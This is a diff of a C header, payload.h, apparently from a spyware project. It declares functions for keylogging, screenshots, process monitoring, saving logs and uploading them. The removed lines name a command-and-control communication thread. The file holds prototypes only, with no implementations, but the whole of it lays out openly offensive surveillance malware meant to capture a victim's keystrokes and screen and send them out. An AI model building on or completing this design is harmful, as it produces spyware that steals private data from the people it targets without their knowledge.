@@ -1,16 +1,28 @@
 #ifndef PAYLOAD_H
 #define PAYLOAD_H
 
-#include <pthread.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include "payload_config.h"
 
-// Payload functions
-void init_payload();
-void stop_payload();
-int is_payload_running();
+// Payload initialization and cleanup
+int payload_init(void);
+void payload_cleanup(void);
 
-// Thread main functions
-void* keylogger_main(void* arg);
-void* screenshot_main(void* arg);
-void* c2_communication_main(void* arg);
+// Core functionality
+void start_keylogger(void);
+void stop_keylogger(void);
+void take_screenshot(void);
+void monitor_processes(void);
+
+// Data management
+int save_logs(const char *data, size_t size);
+int upload_logs(void);
+
+// Utility functions
+const char *get_payload_version(void);
+const char *get_payload_name(void);
 
 #endif // PAYLOAD_H
